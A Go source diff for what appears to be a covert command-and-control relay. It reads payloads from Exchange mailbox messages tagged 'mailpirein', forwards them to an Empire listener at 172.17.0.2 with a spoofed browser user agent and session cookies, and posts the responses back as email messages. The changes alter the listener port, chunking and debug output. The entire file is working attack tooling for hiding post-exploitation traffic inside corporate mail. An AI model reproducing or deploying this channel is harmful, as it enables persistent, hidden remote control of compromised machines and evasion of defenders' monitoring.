@@ -154,12 +154,22 @@ func main() {
 			}
 		}
 		fmt.Printf("Folderid: %x\n", folderid)
-
+		x := make([]byte, 111100)
+		for k := range x {
+			x[k] = 0x41
+		}
+		x[0] = 0x46
+		x[1] = 0x44
+		x[2] = 0x42
+		x[11099] = 0x46
+		//sendMessage(folderid, string(x))
 		for {
 			//get stage 1 from client and forward to Empire
 			rpc := getMessage(folderid)
 			if rpc != "" {
+				//fmt.Println(rpc)
 				//post to client
+				fmt.Println("Sending message of length: ", len(rpc))
 				sendMessage(folderid, rpc)
 			}
 		}
@@ -178,18 +188,19 @@ func main() {
 
 func sendMessage(folderid []byte, rpc string) {
 
-	propertyTagx := make([]mapi.TaggedPropertyValue, 8)
+	propertyTagx := make([]mapi.TaggedPropertyValue, 7)
 
-	propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, utils.UniString(rpc)}
-	propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, utils.UniString("mailpirein")}
-	propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, utils.UniString("mailpirein")}
+	//propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, utils.UniString("meh")}
+	propertyTagx[5] = mapi.TaggedPropertyValue{mapi.PidTagSubject, utils.UniString("uncommailpirein")}
+	propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, utils.UniString("mailpirein")}
 
-	propertyTagx[1] = mapi.TaggedPropertyValue{mapi.PropertyTag{mapi.PtypString, 0x001A}, utils.UniString("IPM.Note")}
-	propertyTagx[2] = mapi.TaggedPropertyValue{mapi.PidTagConversationTopic, utils.UniString("mailpirein")}
-	propertyTagx[3] = mapi.PidTagIconIndex
-	propertyTagx[4] = mapi.PidTagMessageEditorFormat
-	propertyTagx[5] = mapi.TaggedPropertyValue{mapi.PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
-	var split int = 9972 //must be multiple of 3, otherwise we get the - at end of line
+	propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PropertyTag{mapi.PtypString, 0x001A}, utils.UniString("IPM.Note")}
+	propertyTagx[1] = mapi.TaggedPropertyValue{mapi.PidTagConversationTopic, utils.UniString("mailpirein")}
+	propertyTagx[2] = mapi.PidTagIconIndex
+	propertyTagx[3] = mapi.PidTagMessageEditorFormat
+	propertyTagx[4] = mapi.TaggedPropertyValue{mapi.PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
+
+	var split int = 1119972 //must be multiple of 3, otherwise we get the - at end of line
 	if len(rpc) > split {
 
 		piecescnt := len(rpc) / split
@@ -218,29 +229,43 @@ func sendMessage(folderid []byte, rpc string) {
 
 			propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, utils.UniString(rrpc)}
 
-			_, er := mapi.CreateMessage(folderid, propertyTagx)
+			x, er := mapi.CreateMessage(folderid, propertyTagx)
 			if er != nil {
 				exit(er)
 			}
+			fmt.Println(x.MessageID)
 		}
 		if len(rpc) > split*piecescnt {
 			rrpc = rpc[index:]
 			propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, utils.UniString(rrpc + "\n\r")}
 			propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, utils.UniString("mailpirein-s")}
 			propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, utils.UniString("mailpirein-s")}
-			_, er := mapi.CreateMessage(folderid, propertyTagx)
+			x, er := mapi.CreateMessage(folderid, propertyTagx)
 
 			if er != nil {
 				exit(er)
 			}
+
+			fmt.Println(x.MessageID)
 		}
 
 	} else {
-		_, er := mapi.CreateMessage(folderid, propertyTagx)
+		x, er := mapi.CreateMessage(folderid, propertyTagx)
 
 		if er != nil {
 			exit(er)
 		}
+		fmt.Println("Message ID: ", x.MessageID)
+
+		//rpc = string(make([]byte, 3000))
+		//bodyProp := make([]mapi.TaggedPropertyValue, 1)
+		rpc = string(append([]byte{0x41, 0x41}, []byte(rpc)...))
+		bodyProp := mapi.TaggedPropertyValue{mapi.PidTagBody, utils.UniString(rpc)}
+		mapi.SetPropertyFast(folderid, x.MessageID, bodyProp)
+
+		completeSubject := mapi.TaggedPropertyValue{mapi.PidTagSubject, utils.UniString("xxmailpirein")}
+		mapi.SetPropertyFast(folderid, x.MessageID, completeSubject)
+
 	}
 	//fmt.Println(res.MessageID)
 }
@@ -300,26 +325,28 @@ func getMessage(folderid []byte) string {
 
 					if string(payload[0:5]) == "POST " {
 						pp := toBytes(payload[7:])
-
-						req, _ = http.NewRequest("POST", "http://172.17.0.2:80/index.jsp", bytes.NewBuffer(pp))
+						fmt.Println("POST: ")
+						req, _ = http.NewRequest("POST", "http://172.17.0.2:8080/index.jsp", bytes.NewBuffer(pp))
 						req.Header.Add("Content-Type", "application/binary")
 						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
 						//resp, err := http.Post("http://172.17.0.2:80/index.jsp", "application/binary", strings.NewReader(payload))
 					} else if string(payload[0:3]) == "GET" {
+						fmt.Println("GET")
 						pi := strings.Split(payload, "-")
 						uri := pi[2]
 						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
-						req, _ = http.NewRequest("GET", "http://172.17.0.2:80/"+uri, nil)
+						req, _ = http.NewRequest("GET", "http://172.17.0.2:8080/"+uri, nil)
 						req.Header.Add("Content-Type", "application/binary")
 						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
 						req.AddCookie(c)
 					} else if string(payload[0:5]) == "POSTM" {
 						pi := strings.Split(payload, "-")
+						fmt.Println("POSTM: ")
 						uri := pi[1]
 						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
 						lenn := len(pi[0]) + len(pi[1]) + 3
 						pp := toBytes(payload[lenn:])
-						req, _ = http.NewRequest("POST", "http://172.17.0.2:80/"+uri, bytes.NewBuffer(pp))
+						req, _ = http.NewRequest("POST", "http://172.17.0.2:8080/"+uri, bytes.NewBuffer(pp))
 						req.Header.Add("Content-Type", "application/binary")
 						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
 						req.AddCookie(c)
@@ -349,6 +376,7 @@ func getMessage(folderid []byte) string {
 			break
 		}
 	}
+
 	return rpc
 }
 func toBytes(input string) []byte {
